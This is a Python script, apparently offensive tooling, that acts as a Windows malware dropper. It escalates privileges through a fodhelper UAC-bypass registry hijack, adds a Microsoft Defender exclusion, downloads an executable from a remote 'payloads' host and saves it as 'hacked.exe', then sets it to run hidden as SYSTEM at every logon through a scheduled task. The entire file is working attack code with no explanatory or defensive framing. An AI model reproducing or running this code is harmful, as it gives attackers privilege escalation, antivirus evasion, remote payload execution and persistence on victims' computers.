import subprocess
import ctypes
import threading
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_powershell_script_elevated():
    if is_admin():
        powershell = [
    "$directoryPath = Join-Path $HOME 'hello'",
    "Add-MpPreference -ExclusionPath $directoryPath",
    "$url = 'http://192.168.11.108/payloads/nono.exe'",
    "$targetDirectory = Join-Path $HOME 'hello'",
    "if (-not (Test-Path -Path $targetDirectory)) {New-Item -Path $targetDirectory -ItemType Directory -Force}",
    "$outputFile = Join-Path $targetDirectory 'hacked.exe'",
    "$programName = 'hacked'",
    "$programPath = $outputFile ",
    "Invoke-WebRequest -Uri $url -OutFile $outputFile",
    "$installerPath = $outputFile",
    "$taskName = 'User_Feed_ESRV'",
    "$taskPath = $programPath ",
    "schtasks /create /SC ONLOGON /TN $taskName /TR $taskPath /RU SYSTEM /RL HIGHEST /IT",
    "$taskFolder = '\'",
    "$objService = New-Object -ComObject 'Schedule.Service'",
    "$objService.Connect()",
    "$objRootFolder = $objService.GetFolder($taskFolder)",
    "$objTask = $objRootFolder.GetTask($taskName)",
    "$objTaskDefinition = $objTask.Definition",
    "$objTaskDefinition.Settings.StopIfGoingOnBatteries = $false",
    "$objTaskDefinition.Settings.DisallowStartIfOnBatteries = $false",
    "$objTaskDefinition.Settings.Hidden = $true",
    "$objTaskDefinition.Settings.StartWhenAvailable = $true",
    "$objTaskDefinition.Settings.Priority = 1",
    "$objRootFolder.RegisterTaskDefinition($taskName, $objTaskDefinition, 6, $null, $null, 0, $null)",
    "Start-Process -FilePath $installerPath -PassThru -WindowStyle Hidden -Verb RunAs"
]


        powershell_com = " ; ".join(powershell)


        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)



    else:
        exe_file_path = os.path.abspath(sys.argv[0])
        
        powershell_command = f"""New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(Default)' -Value '{exe_file_path}'"""
        

        subprocess.run(["powershell.exe", "-v", "2", "-command", powershell_command], shell=True)
        subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "C:\\Windows\\System32\\fodhelper.exe"], shell=True)

        sys.exit(1)

def run_powershell_thread():
    run_powershell_script_elevated()

if __name__ == "__main__":
  
    powershell_thread = threading.Thread(target=run_powershell_thread)

    
    powershell_thread.start()
